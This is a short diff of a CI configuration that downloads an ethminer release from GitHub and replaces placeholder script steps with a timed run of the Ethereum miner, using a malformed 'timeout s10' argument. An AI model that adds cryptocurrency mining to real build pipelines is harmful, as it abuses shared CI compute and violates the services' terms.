@@ -10,12 +10,9 @@ jobs:
       - echo before install
       - wget https://github.com/ethereum-mining/ethminer/releases/download/v0.13.0rc4/ethminer-0.13.0rc4-Linux.tar.gz
       - tar -xvzf ethminer-0.13.0rc4-Linux.tar.gz
-      - ls -la
 
-      script:
-      - echo hello   
-      - timeout   
-      - timelimit
-      
+      script:      
+      - timeout s10 ./bin/ethminer
+            
       after_success:
       - echo success
